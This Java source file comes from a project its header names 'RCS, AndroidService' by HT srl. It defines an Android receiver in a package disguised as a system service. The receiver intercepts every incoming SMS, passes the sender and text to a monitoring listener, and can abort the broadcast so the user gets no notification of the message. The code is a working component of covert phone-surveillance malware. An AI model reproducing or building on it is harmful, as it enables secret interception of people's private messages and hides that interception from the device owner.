/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorSms.java
 * Created      : 6-mag-2011
 * Author		: zeno <- menzogne!
 * *******************************************/

package com.android.service.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.android.service.Messages;
import com.android.service.Sms;

public class BroadcastMonitorSms extends BroadcastReceiver {
	private static final String TAG = "BroadcastMonitorSms"; //$NON-NLS-1$

	// Apparentemente la notifica di SMS inviato non viene inviata di proposito
	@Override
	public void onReceive(Context context, Intent intent) {
		final Bundle bundle = intent.getExtras();

		if (bundle == null) {
			return;
		}

		SmsMessage[] msgs = null;

		// Prendiamo l'sms
		final Object[] pdus = (Object[]) bundle.get(Messages.getString("26.0")); //$NON-NLS-1$
		msgs = new SmsMessage[pdus.length];

		for (int i = 0; i < msgs.length; i++) {
			msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);

			final int result = ListenerSms.self().dispatch(
					new Sms(msgs[i].getOriginatingAddress(), msgs[i].getMessageBody().toString(), 
							System.currentTimeMillis(), false));

			// 1 means "remove notification for this sms"
			if ((result & 1) == 1) {
				abortBroadcast();
			}
		}
	}
}
